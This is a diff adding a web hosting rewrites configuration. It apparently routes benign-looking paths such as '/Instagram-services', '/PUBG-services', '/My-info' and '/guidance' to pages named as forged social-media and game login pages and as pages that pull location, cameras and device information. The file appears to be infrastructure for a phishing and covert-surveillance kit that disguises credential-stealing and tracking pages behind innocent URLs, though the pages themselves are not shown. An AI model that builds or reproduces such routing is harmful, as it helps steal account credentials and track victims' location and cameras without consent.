@@ -1,0 +1,15 @@
+{
+  "rewrites": [
+    { "source": "/WhatsApp-services", "destination": "/WhatsApp forged.html" },
+    { "source": "/X-Platform-Services", "destination": "/x forged.html" },
+    { "source": "/TikTok-services", "destination": "/Tik Tok forged.html" },
+    { "source": "/Snapchat-services", "destination": "/Snapchat forged.html" },
+    { "source": "/Pharaoh", "destination": "/pull your location.html" },
+    { "source": "/PUBG-services", "destination": "/PUBG forged.html" },
+    { "source": "/My-info", "destination": "/Mix Cameras.html" },
+    { "source": "/Instagram-services", "destination": "/Instagram forged.html" },
+    { "source": "/Free-Fire-services", "destination": "/Free Fire forged.html" },
+    { "source": "/Facebook-services", "destination": "/facebook forged.html" },
+    { "source": "/guidance", "destination": "/Device info retrieved.html" }
+  ]
+}
